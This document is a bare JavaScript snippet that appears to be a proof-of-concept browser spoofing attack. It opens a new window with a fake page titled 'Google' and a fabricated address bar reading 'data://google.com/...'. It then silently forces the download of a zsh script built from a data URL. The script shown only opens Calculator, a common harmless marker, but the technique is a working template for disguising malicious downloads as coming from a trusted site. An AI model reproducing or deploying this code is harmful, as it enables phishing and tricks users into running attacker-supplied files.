<script>
  function spoofDownload() {
    const spoofWin = window.open('', '_blank');
    const fakePage = `
      <!DOCTYPE html>
      <html><head><title>Google</title><style>body, html { margin:0; padding:0; height:100%; background:#fff; } .addr { position:fixed; top:0; left:0; width:100%; background:#f1f1f1; padding:8px; font-family:monospace; font-size:12px; color:#d93025; z-index:9999; }</style></head>
      <body><div class="addr">data://google.com/html,somereallyreallylongtextattheaddressbarthatlookslikearealdownloadfromgooglebutactuallytriggeringafiledownloadfromonydosegithubio</div><iframe src="about:blank" style="width:100%; height:100%; border:none;"></iframe></body></html>
    `;
    spoofWin.document.write(fakePage);
    spoofWin.document.close();

    setTimeout(() => {
      const zshContent = `#/bin/zsh\nopen /System/Applications/Calculator.app`;
      const zshUrl = `data:text/zsh;base64,${btoa(zshContent)}`;
      const link = document.createElement('a');
      link.href = zshUrl;
      link.download = 'x.zsh'; // Changed to .zsh
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      setTimeout(() => spoofWin.close(), 2000);
    }, 800);
  }
</script>
